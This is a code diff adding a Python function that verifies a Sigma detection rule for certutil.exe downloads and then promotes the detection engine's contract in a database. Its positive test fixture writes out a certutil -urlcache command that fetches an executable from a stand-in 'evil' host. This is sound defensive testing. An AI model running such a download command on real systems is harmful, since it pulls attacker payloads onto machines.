@@ -78,6 +78,71 @@ async def declare_all_contracts(db) -> dict:
     }
 
 
+async def bootstrap_verified_detection_contracts(db) -> dict:
+    """
+    Ensure the native NivXRay detection engine is verified and promoted
+    to EXECUTION_VERIFIED with execution.detection=True.
+    Resolves the ENGINE_UNBOUND operational gap deterministically.
+    """
+    from .detection_harness import HarnessFixture, run_harness, record_verification
+    from .nivxray_native_sigma import evaluate as nx_evaluate
+
+    certutil_rule = """
+title: certutil download
+id: 00000000-0000-0000-0000-000000000010
+level: high
+tags: [attack.t1105]
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        Image|endswith: '\\certutil.exe'
+        CommandLine|contains: 'urlcache'
+    condition: selection
+"""
+    positive_ev = {
+        "Image":       "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://evil/x.exe",
+        "Product":     "windows",
+        "Category":    "process_creation",
+    }
+    negative_ev = {
+        "Image":       "C:\\Windows\\System32\\notepad.exe",
+        "CommandLine": "notepad.exe C:\\Users\\me\\report.txt",
+        "Product":     "windows",
+        "Category":    "process_creation",
+    }
+
+    result = run_harness(
+        engine_id       = "nivxray::detection_content::nivxray_native_sigma",
+        rule_body       = certutil_rule,
+        engine_evaluate = nx_evaluate,
+        positive        = HarnessFixture("cert_pos", positive_ev, True),
+        negative        = HarnessFixture("cert_neg", negative_ev, False),
+    )
+
+    if result.verdict == "EXECUTION_VERIFIED" and db is not None:
+        rec = await record_verification(db, result)
+        # Ensure semantic domain coverage in consumes
+        await db[CONTRACTS_COLLECTION].update_one(
+            {"engine_id": "nivxray::detection_content::nivxray_native_sigma"},
+            {"$addToSet": {
+                "consumes": {
+                    "$each": [
+                        "canonical.evidence", "process.artifact", "script",
+                        "file.artifact", "network.artifact", "command_line",
+                        "process_event", "identity.artifact", "cloud.artifact",
+                        "security.event", "auth.event"
+                    ]
+                }
+            }}
+        )
+        return {"status": "EXECUTION_VERIFIED", "promoted": True, "engine_id": result.engine_id}
+
+    return {"status": result.verdict, "promoted": False, "engine_id": result.engine_id}
+
+
 async def contract_report(db) -> dict:
     coll = db[CONTRACTS_COLLECTION]
     total = await coll.count_documents({})
